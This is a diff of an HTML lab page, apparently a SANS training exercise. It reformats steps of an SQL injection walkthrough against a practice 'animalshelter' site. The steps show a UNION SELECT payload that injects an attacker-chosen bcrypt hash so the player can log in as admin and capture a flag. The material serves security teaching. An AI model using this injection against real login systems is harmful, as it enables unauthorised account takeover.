@@ -1185,17 +1185,21 @@ fetch('https://lab-2.1.sans.labs:80');
    You may use a UNION query to trick this query into returning whatever password you entered, not the actual password for the user admin. Let's try this by connecting to the database directly.</p>
 </li>
 <li>
-<p>Open a terminal.</p>
+<p>Open an OS terminal window.</p>
 </li>
 <li>
-<p>Enter
-   <code>mysql animalshelter</code>
-   to connect to the "animalshelter" database.</p>
+<p>Enter the command,</p>
+<div class="codehilite"><pre><span></span><code>mysql animalshelter
+</code></pre></div>
+
+<p>to connect to the "animalshelter" database.</p>
 </li>
 <li>
-<p>Enter
-   <code>select username, password from users where user='admin'</code>
-   You will receive a response like</p>
+<p>Enter the query,</p>
+<div class="codehilite"><pre><span></span><code>select username, password from users where username=&#39;admin&#39;;
+</code></pre></div>
+
+<p>You will receive a response like</p>
 <div class="highlight"><pre><span></span><code>+----------+--------------------------------------------+
 | username | password                                   |
 +----------+--------------------------------------------+
@@ -1208,11 +1212,13 @@ fetch('https://lab-2.1.sans.labs:80');
 </li>
 <li>
 <p>We have to create a UNION query to return the password hash we need. You may experiment with the MySQL command line. For example, for the password <code>abc</code>, the query would look like this:</p>
+<div class="highlight"><pre><span></span><code>SELECT username, password FROM users WHERE username=&#39;&#39; UNION SELECT &#39;admin&#39;,&#39;$2y$10$G0aDOmI7vQsmfUw2[part removed]Wzy6S&#39;
+</code></pre></div>
+</li>
+<li>
+<p>Now create the correct username to log in as <code>admin</code> with the password <code>abc</code> (or whatever password you selected). The flag for the scoreboard will be displayed once you are successful.</p>
 </li>
 </ol>
-<p><div class="highlight"><pre><span></span><code>SELECT username, password FROM users WHERE username=&#39;&#39; UNION SELECT &#39;admin&#39;,&#39;$2y$10$G0aDOmI7vQsmfUw2[part removed]Wzy6S&#39;
-</code></pre></div>
-10. Now create the correct username to log in as <code>admin</code> with the password <code>abc</code> (or whatever password you selected). The flag for the scoreboard will be displayed once you are successful.</p>
 <hr />
 <h2 id="conclusion">Conclusion</h2>
 <ul>
